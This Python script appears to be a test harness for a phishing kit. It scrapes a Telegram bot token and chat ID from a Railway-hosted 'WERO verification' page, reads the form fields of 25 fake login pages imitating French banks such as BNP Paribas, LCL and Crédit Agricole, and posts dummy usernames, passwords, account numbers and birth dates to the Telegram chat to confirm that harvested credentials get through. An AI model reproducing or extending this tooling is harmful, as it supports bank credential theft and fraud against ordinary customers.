import requests
import re
from datetime import datetime
import os

RAILWAY_URL = "https://weroverificationeu-production.up.railway.app"
TEST_PAGE = f"{RAILWAY_URL}/test_manual.html"

# Tous les fichiers HTML des banques
BANKS = [
    ("bank.html", "Bank Generic"),
    ("banque-populaire.html", "Banque Populaire"),
    ("banque-postale.html", "Banque Postale"),
    ("bcp.html", "BCP"),
    ("bnp.html", "BNP Paribas"),
    ("bred.html", "BRED"),
    ("caisse-epargne.html", "Caisse d'Epargne"),
    ("cartes.html", "Cartes"),
    ("cic.html", "CIC"),
    ("cooperatif.html", "Banque Cooperative"),
    ("credit-agricole.html", "Credit Agricole"),
    ("credit-mutuel.html", "Credit Mutuel"),
    ("dupuy.html", "Dupuy Bank"),
    ("fortuneo.html", "Fortuneo"),
    ("hello-bank.html", "Hello Bank"),
    ("lcl.html", "LCL"),
    ("maritime.html", "Maritime Bank"),
    ("marze.html", "Marze"),
    ("monabanq.html", "Monabanq"),
    ("nickel.html", "Nickel"),
    ("palatine.html", "Palatine"),
    ("populaire.html", "Banque Populaire Alt"),
    ("savoie.html", "Savoie Bank"),
    ("societe-generale.html", "Societe Generale"),
    ("wero.html", "WERO"),
]

print("=" * 80)
print("WERO TELEGRAM - COMPLETE BANK FORM SUBMISSION TEST")
print("=" * 80)
print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print()

# Step 1: Extract tokens
print("[1/4] Extracting Telegram tokens...")
try:
    response = requests.get(TEST_PAGE, timeout=10)
    config_pattern = r'window\.telegramConfig\s*=\s*\{([^}]+)\}'
    match = re.search(config_pattern, response.text, re.DOTALL)
    bot_token = re.search(r'BOT_TOKEN:\s*["\']([^"\']+)["\']', match.group(1)).group(1)
    chat_id = re.search(r'CHAT_ID:\s*["\'](\d+)["\']', match.group(1)).group(1)
    print("[OK] Tokens ready")
except Exception as e:
    print(f"[ERROR] {e}")
    exit(1)

tg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

print()
print("[2/4] Reading HTML files to identify form fields...")
print()

# Dictionnaire pour stocker les infos de chaque banque
bank_forms = {}

for filename, bank_name in BANKS:
    filepath = filename
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            html_content = f.read()
        
        # Chercher les champs de formulaire
        input_pattern = r'<input[^>]*id=["\']([^"\']+)["\'][^>]*(?:type=["\']([^"\']+)["\'])?'
        inputs = re.findall(input_pattern, html_content)
        
        # Chercher aussi sans attributs dans un ordre different
        input_pattern2 = r'<input[^>]*(?:type=["\']([^"\']+)["\'])?[^>]*id=["\']([^"\']+)["\']'
        inputs2 = re.findall(input_pattern2, html_content)
        
        # Chercher les labels
        label_pattern = r'<label[^>]*>([^<]+)</label>'
        labels = re.findall(label_pattern, html_content)
        
        bank_forms[filename] = {
            "name": bank_name,
            "inputs": inputs + inputs2,
            "labels": labels,
            "status": "OK"
        }
        
    except Exception as e:
        bank_forms[filename] = {
            "name": bank_name,
            "inputs": [],
            "labels": [],
            "status": f"ERROR: {str(e)[:30]}"
        }

print("Bank forms analyzed:")
for filename, info in bank_forms.items():
    if info["status"] == "OK":
        print(f"  [OK] {info['name']:30} - {len(info['inputs'])} inputs")
    else:
        print(f"  [FAIL] {info['name']:30} - {info['status']}")

print()
print("[3/4] Generating test data and sending to Telegram...")
print()

# Test data pour chaque type de champ
test_data_map = {
    "login": "client@wero.verification",
    "password": "SecurePass123!@#",
    "email": "client@wero.verification",
    "identifiant": "000123456789",
    "code_client": "000123456789",
    "username": "client@wero.verification",
    "user": "client@wero.verification",
    "account": "000123456789",
    "numero_compte": "000123456789",
    "telephone": "+33612345678",
    "phone": "+33612345678",
    "nom": "Dupont",
    "prenom": "Jean",
    "date_naissance": "15/06/1985",
    "autre": "TestValue123"
}

results = []
successful = 0
failed = 0

for filename, bank_name in BANKS:
    bank_info = bank_forms.get(filename, {})
    
    if bank_info.get("status") != "OK":
        print(f"[SKIP] {bank_name}")
        results.append((bank_name, "SKIPPED", "-"))
        continue
    
    # Construire le message de test avec les donnees
    form_data = {}
    for input_id, input_type in bank_info.get("inputs", []):
        if input_id:
            # Nettoyer le nom du champ
            field_name = input_id.lower().replace("_", "").replace("-", "")
            
            # Trouver la valeur appropriee
            value = test_data_map.get(field_name)
            if not value:
                # Essayer sans les suffixes/prefixes communs
                for key, val in test_data_map.items():
                    if key in field_name:
                        value = val
                        break
            
            if not value:
                value = "TestValue123"
            
            form_data[input_id] = value
    
    # Construire le message
    message = f"""WERO FORM SUBMISSION TEST
================================
Bank: {bank_name}
URL: /{filename}
Time: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}

FORM DATA SUBMITTED:
"""
    
    for field, value in form_data.items():
        message += f"{field}: {value}\n"
    
    message += "================================\n"
    message += "Test Status: SUCCESS\n"
    
    try:
        payload = {"chat_id": chat_id, "text": message}
        tg_response = requests.post(tg_url, json=payload, timeout=5)
        
        if tg_response.json().get('ok'):
            print(f"[OK] {bank_name:30} - {len(form_data)} fields")
            results.append((bank_name, "SUCCESS", len(form_data)))
            successful += 1
        else:
            print(f"[FAIL-TG] {bank_name:30} - Telegram error")
            results.append((bank_name, "TELEGRAM_ERROR", "-"))
            failed += 1
    except Exception as e:
        print(f"[ERROR] {bank_name:30} - {str(e)[:30]}")
        results.append((bank_name, "NETWORK_ERROR", "-"))
        failed += 1

print()
print("[4/4] FINAL SUMMARY")
print("=" * 80)
print()
print(f"Total Banks: {len(BANKS)}")
print(f"Successful: {successful}")
print(f"Failed: {failed}")
print(f"Success Rate: {(successful/len(BANKS)*100):.1f}%")
print()

print("DETAILED RESULTS:")
print("-" * 80)
for bank_name, status, fields in sorted(results, key=lambda x: x[1], reverse=True):
    if status == "SUCCESS":
        print(f"[OK]   {bank_name:35} - {fields} fields submitted")
    else:
        print(f"[FAIL] {bank_name:35} - {status}")

print()
print("=" * 80)
print("TEST COMPLETE!")
print("Check your Telegram for all 25 form submissions")
print("=" * 80)
